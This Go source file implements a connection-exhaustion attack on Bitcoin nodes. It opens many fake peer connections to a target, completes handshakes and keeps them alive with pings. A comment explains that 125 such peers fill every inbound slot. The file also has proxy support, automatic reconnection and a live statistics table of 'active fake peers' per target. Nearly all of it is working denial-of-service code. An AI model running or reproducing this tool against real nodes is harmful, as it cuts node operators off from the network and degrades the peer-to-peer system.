package main

import (
	"fmt"
	"net"
	"sync/atomic"
	"time"
)

var targets []*Target

func slowDownBitcoinPeer(address net.TCPAddr, numberPeerFlood int) {
	fmt.Printf("Target %s flood with %d peers\n", address.String(), numberPeerFlood)

	target := createTarget(address, numberPeerFlood)
	targets = append(targets, &target)

	target.slowDown()
}

// Target is a target Bitcoin node
type Target struct {
	address         net.TCPAddr
	addressA        string
	numberPeerFlood int64

	// statistics
	activeFakePeers, activeAttempts int64
	handshakeErrors                 int64
	connectErrors                   int64
}

func createTarget(address net.TCPAddr, numberPeerFlood int) Target {
	return Target{address: address, addressA: address.String(), numberPeerFlood: int64(numberPeerFlood)}
}

/*
Background:
https://github.com/bitcoin/bitcoin/blob/df7addc4c6e990141869c41decaf3ef98c4e45d2/src/net.h

The maximum number of peer connections to maintain.
static const unsigned int DEFAULT_MAX_PEER_CONNECTIONS = 125;

This means that if we manage to acquire 125 peers to the target, it exhausts all inbound connection slots.
*/

func (t *Target) slowDown() {
	initialSlowConnect := true

	for count := 0; int64(count) < t.numberPeerFlood; count++ {
		// Try to initially only connect 5. Then scale up!
		if count == 5 && initialSlowConnect {
			initialSlowConnect = false

			// wait until 3 active nodes
			for {
				if t.activeFakePeers >= 3 {
					break
				}

				time.Sleep(time.Second * 1)
			}
		}

		go t.fakePeerConnect()

		// wait for each one at least 1 second to not be too aggressive initially
		time.Sleep(time.Second * 1)
	}
}

// fakePeerConnect creates a single connection and tries to maintain it. Automated re-connect attempt.
func (t *Target) fakePeerConnect() {
	node := NewNode(&t.address)
	if node == nil {
		fmt.Printf("Error creating new node\n")
		return
	}

	for {
		// limit to max 10 concurrent attempts to not waste too many resources
		if t.activeAttempts-t.activeFakePeers >= 10 {
			time.Sleep(time.Millisecond * 1000)
			continue
		}

		atomic.AddInt64(&t.activeAttempts, 1)

		t.createConnectionPing(node)

		node.Close()
		atomic.AddInt64(&t.activeAttempts, -1)

		time.Sleep(time.Millisecond * 400)
	}
}

func (t *Target) createConnectionPing(node *Node) {
	var err error

	if proxyEnable {
		// Use proxy
		_, err = node.ConnectProxy()
	} else {
		_, err = node.Connect2()
	}

	if err != nil {
		//fmt.Printf("Connect error: %v\n", err)
		atomic.AddInt64(&t.connectErrors, 1)
		return
	}

	err = node.Handshake()
	if err != nil {
		//fmt.Printf("Handshake error: %v\n", err)
		atomic.AddInt64(&t.handshakeErrors, 1)

		return
	}

	// valid connection
	atomic.AddInt64(&t.activeFakePeers, 1)
	defer atomic.AddInt64(&t.activeFakePeers, -1)

	for {
		time.Sleep(time.Second * 10)

		// endless ping (?)
		// This is probably very noisy and could result into auto blocking. For testing it is good enough though.
		node.Ping()
		if err != nil {
			fmt.Printf("Ping error: %v\n", err)

			return
		}

		_, err := node.receiveMessageTimeout("pong")
		if err != nil {
			//fmt.Printf("Pong error: %v\n", err)

			return
		}
	}
}

func stats() {
	for {
		<-time.After(time.Second * 5)

		var sumCount, sumFakePeers, sumAttempts, sumSleeping, sumHandshakeErr, sumConnectErr int64

		fmt.Println("------------------------------------------------------------------------------------------------------------------------")
		fmt.Println("Target                  Active Fake Peers    Attempts to Connect    Currently Sleeping    Handshake Errs    Connect Errs")
		fmt.Println("------------------------------------------------------------------------------------------------------------------------")

		for _, t := range targets {
			fmt.Printf("%-21s               %5d                  %5d                 %5d             %5d           %5d\n", t.addressA, t.activeFakePeers, t.activeAttempts-t.activeFakePeers, t.numberPeerFlood-t.activeAttempts, t.handshakeErrors, t.connectErrors)

			sumCount++
			sumFakePeers += t.activeFakePeers
			sumAttempts += t.activeAttempts - t.activeFakePeers
			sumSleeping += t.numberPeerFlood - t.activeAttempts
			sumHandshakeErr += t.handshakeErrors
			sumConnectErr += t.connectErrors

			// reset stats
			atomic.StoreInt64(&t.handshakeErrors, 0)
			atomic.StoreInt64(&t.connectErrors, 0)
		}

		fmt.Println("------------------------------------------------------------------------------------------------------------------------")

		// output summary
		fmt.Printf("All Targets %-5d                   %5d                  %5d                 %5d             %5d           %5d\n", sumCount, sumFakePeers, sumAttempts, sumSleeping, sumHandshakeErr, sumConnectErr)

		fmt.Println("------------------------------------------------------------------------------------------------------------------------")
		fmt.Println("Target                  Active Fake Peers    Attempts to Connect    Currently Sleeping    Handshake Errs    Connect Errs")
		fmt.Println("------------------------------------------------------------------------------------------------------------------------")

		fmt.Printf("\n")
	}
}
